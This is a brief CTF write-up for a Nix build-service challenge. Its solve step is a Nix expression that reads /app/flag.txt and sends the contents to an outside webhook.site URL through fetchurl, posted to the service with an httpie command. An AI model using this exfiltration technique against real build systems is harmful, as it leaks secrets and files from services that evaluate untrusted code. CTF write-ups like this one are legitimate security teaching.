## About

Author: `mbund`

`misc` `easy`

CTF challenge based on a public Nix build cache.

> Well clearly this isn't nothing...

## Name

Nix is sort of a normal informal English word. Other possibilities were zero, zilch and zip.

## Solve

Upload the following nix expression to the build service (you don't even need to use the cache).

```
http localhost:3000/build expression=@solve.nix
```

```nix
let
  pkgs = import <nixpkgs> {};
in
  pkgs.fetchurl {
    url = "https://webhook.site/abdf5075-d1cd-4218-96b0-4e5b341dc2e1/${builtins.replaceStrings ["{" "}"] ["%7B" "%7D"] (builtins.readFile /app/flag.txt)}";
  }
```
